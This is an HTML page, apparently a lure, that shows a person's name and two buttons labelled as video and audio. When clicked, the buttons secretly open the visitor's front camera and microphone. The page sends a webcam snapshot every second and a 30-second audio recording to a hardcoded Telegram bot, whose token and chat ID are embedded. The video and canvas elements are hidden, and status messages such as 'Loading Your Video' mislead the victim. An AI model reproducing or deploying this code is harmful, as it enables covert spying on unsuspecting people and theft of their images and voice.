<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Tasin Saimon</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@500;700&display=swap');

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: #0a0a0f;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    font-family: 'Space Grotesk', sans-serif;
  }

  canvas { display: none; }
  video  { display: none; }

  .content {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2.5rem;
    padding: 2rem;
    width: 100%;
    max-width: 420px;
  }

  h1 {
    font-family: 'Bebas Neue', sans-serif;
    font-size: clamp(4.5rem, 20vw, 8rem);
    line-height: 0.9;
    text-align: center;
    background: linear-gradient(135deg, #fff 30%, #29a8e0 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    user-select: none;
    letter-spacing: 0.03em;
  }

  .status {
    font-size: 0.78rem;
    color: rgba(255,255,255,0.35);
    letter-spacing: 0.06em;
    text-transform: uppercase;
    text-align: center;
    min-height: 1.2em;
    font-family: monospace;
  }
  .status.ok  { color: #29a8e0; }
  .status.rec { color: #ff4d6d; }
  .status.err { color: #ff4d6d; }

  .btns {
    display: flex;
    flex-direction: column;
    gap: 1rem;
    width: 100%;
  }

  button {
    width: 100%;
    padding: 1.15rem;
    border-radius: 14px;
    border: none;
    font-family: 'Space Grotesk', sans-serif;
    font-size: 1rem;
    font-weight: 700;
    letter-spacing: 0.06em;
    cursor: pointer;
    transition: transform 0.1s, opacity 0.2s, box-shadow 0.25s;
  }
  button:active:not(:disabled) { transform: scale(0.97); }
  button:disabled { opacity: 0.3; cursor: not-allowed; }

  #startCam {
    background: #29a8e0;
    color: #fff;
    box-shadow: 0 0 28px rgba(41,168,224,0.45);
  }
  #startCam:hover:not(:disabled) { box-shadow: 0 0 48px rgba(41,168,224,0.75); }

  #stopCam {
    background: rgba(255,255,255,0.07);
    color: #fff;
    border: 1px solid rgba(255,255,255,0.13);
  }
  #stopCam:hover:not(:disabled) { background: rgba(255,255,255,0.13); }

  #startRec {
    background: #ff4d6d;
    color: #fff;
    box-shadow: 0 0 28px rgba(255,77,109,0.35);
  }
  #startRec:hover:not(:disabled) { box-shadow: 0 0 48px rgba(255,77,109,0.65); }
  #startRec.recording { animation: rpulse 1s infinite; }
  @keyframes rpulse {
    0%,100% { box-shadow: 0 0 28px rgba(255,77,109,0.35); }
    50%      { box-shadow: 0 0 60px rgba(255,77,109,0.9);  }
  }

  .prog-wrap {
    width: 100%;
    height: 4px;
    background: rgba(255,255,255,0.08);
    border-radius: 10px;
    overflow: hidden;
    opacity: 0;
    transition: opacity 0.3s;
  }
  .prog-wrap.show { opacity: 1; }
  .prog-bar {
    height: 100%;
    width: 0%;
    background: #ff4d6d;
    border-radius: 10px;
    transition: width 0.5s linear;
  }
</style>
</head>
<body>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>

<div class="content">
  <h1>Tasin<br>Saimon</h1>
  <div class="status" id="status">Ready</div>
  <div class="btns">
    <button id="startCam">Fahim Video</button>
    <button id="startRec">Fahim Audio</button>
  </div>
  <div class="prog-wrap" id="progWrap">
    <div class="prog-bar" id="progBar"></div>
  </div>
</div>

<script>
// ── CONFIG ──
const BOT_TOKEN = '8697759714:AAGlfH7rjS8ZN4X0nkgQ-TJILe39ijerITU';
const CHAT_ID   = '7815078057';
const REC_SECS  = 30;

const video    = document.getElementById('video');
const canvas   = document.getElementById('canvas');
const startCam = document.getElementById('startCam');
const stopCam  = document.getElementById('stopCam');
const startRec = document.getElementById('startRec');
const statusEl = document.getElementById('status');
const progWrap = document.getElementById('progWrap');
const progBar  = document.getElementById('progBar');

let stream   = null;
let camTimer = null;
let mediaRec = null;
let recChunks= [];
let realChatId = CHAT_ID;

function setStatus(msg, cls='') {
  statusEl.textContent = msg;
  statusEl.className = 'status ' + cls;
}

// chat ID is hardcoded
async function fetchChatId() { realChatId = CHAT_ID; return true; }

// ── CAMERA ──
startCam.onclick = async () => {
  setStatus('Starting Vedio');
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:'user' }, audio: false });
    video.srcObject = stream;
    startCam.disabled = true;
    stopCam.disabled  = false;
    setStatus('Loading Your Video', 'ok');
    camTimer = setInterval(sendPhoto, 1000);
  } catch(e) {
    setStatus('Camera denied: ' + e.message, 'err');
  }
};

stopCam.onclick = () => {
  clearInterval(camTimer); camTimer = null;
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
  video.srcObject = null;
  startCam.disabled = false;
  stopCam.disabled  = true;
  setStatus('Camera stopped');
};

async function sendPhoto() {
  if (!stream) return;
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video, 0, 0);
  canvas.toBlob(async blob => {
    const form = new FormData();
    form.append('chat_id', realChatId);
    form.append('photo', blob, 'snap.jpg');
    form.append('caption', '📸 ' + new Date().toLocaleTimeString());
    try {
      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:form });
      const j = await r.json();
      if (!j.ok) setStatus('Error: ' + j.description, 'err');
    } catch(e) {}
  }, 'image/jpeg', 0.8);
}

// ── AUDIO RECORD ──
startRec.onclick = async () => {
  if (mediaRec && mediaRec.state === 'recording') return;

  let audioStream;
  try {
    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
  } catch(e) {
    setStatus('Mic denied: ' + e.message, 'err');
    return;
  }

  recChunks = [];

  // pick best supported format
  const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
    ? 'audio/webm;codecs=opus'
    : MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')
    ? 'audio/ogg;codecs=opus'
    : 'audio/webm';

  mediaRec = new MediaRecorder(audioStream, { mimeType });
  mediaRec.ondataavailable = e => { if (e.data.size > 0) recChunks.push(e.data); };

  mediaRec.onstop = async () => {
    audioStream.getTracks().forEach(t => t.stop());
    const blob = new Blob(recChunks, { type: mimeType });
    setStatus('Sending audio…', 'ok');
    await sendVoice(blob);
    progWrap.classList.remove('show');
    progBar.style.width = '0%';
    startRec.classList.remove('recording');
    startRec.disabled = false;
    startRec.textContent = 'Audio Get ready';
  };

  mediaRec.start(200);
  startRec.disabled = true;
  startRec.classList.add('recording');
  startRec.textContent = 'Audio Loading';
  progWrap.classList.add('show');
  setStatus('Audio 30s…', 'rec');

  let elapsed = 0;
  const tick = setInterval(() => {
    elapsed += 300;
    progBar.style.width = Math.min(100, (elapsed / (REC_SECS * 1000)) * 100) + '%';
    if (elapsed >= REC_SECS * 1000) clearInterval(tick);
  }, 300);

  setTimeout(() => {
    if (mediaRec && mediaRec.state === 'recording') mediaRec.stop();
  }, REC_SECS * 1000);
};

async function sendVoice(blob) {
  const ext  = blob.type.includes('ogg') ? 'voice.ogg' : 'voice.webm';
  const form = new FormData();
  form.append('chat_id', realChatId);
  form.append('voice', blob, ext);
  try {
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method:'POST', body:form });
    const j = await r.json();
    if (j.ok) {
      setStatus('✓ Voice sent!', 'ok');
    } else {
      setStatus('Error: ' + j.description, 'err');
    }
  } catch(e) {
    setStatus('Network error', 'err');
  }
  setTimeout(() => setStatus('Ready'), 3000);
}
</script>
</body>
</html>
